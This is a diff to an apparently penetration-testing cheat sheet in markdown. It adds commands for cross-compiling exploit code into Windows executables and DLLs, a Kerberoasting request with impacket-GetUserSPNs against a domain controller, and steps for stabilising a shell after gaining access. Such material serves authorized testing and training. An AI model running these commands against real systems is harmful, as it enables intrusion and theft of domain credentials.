@@ -562,11 +562,16 @@ Include multiple variations for different OS targets and filtering environments.
   gcc exploit.c -o exploit -static
   ```
 
-### Reverse Engineering Lite (Strings)
-- **UTF-16 Little Endian (Windows Binaries)**:
-  ```bash
-  strings -e l binary.exe | grep "password"
-  ```
+### Cross-Compiling (Kali to Windows)
+- **Target 64-bit EXE**: `x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lntdll -lws2_32`
+- **Target DLL**: `x86_64-w64-mingw32-gcc -shared -o output.dll input.c`
+
+### Operational Workarounds
+- **Fix Kerberos Clock Skew (Faketime)**:
+  - `faketime -5m impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request`
+- **Fix Failed "bash -i" (TTY Shell)**:
+  - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+  - *Then*: `Ctrl+Z`, `stty raw -echo; fg`, `export TERM=xterm`
 
 ---
 **Final Word:** Keep your shells stable, your enumeration deep, and don't panic. If one door is locked, check the window! 🚀
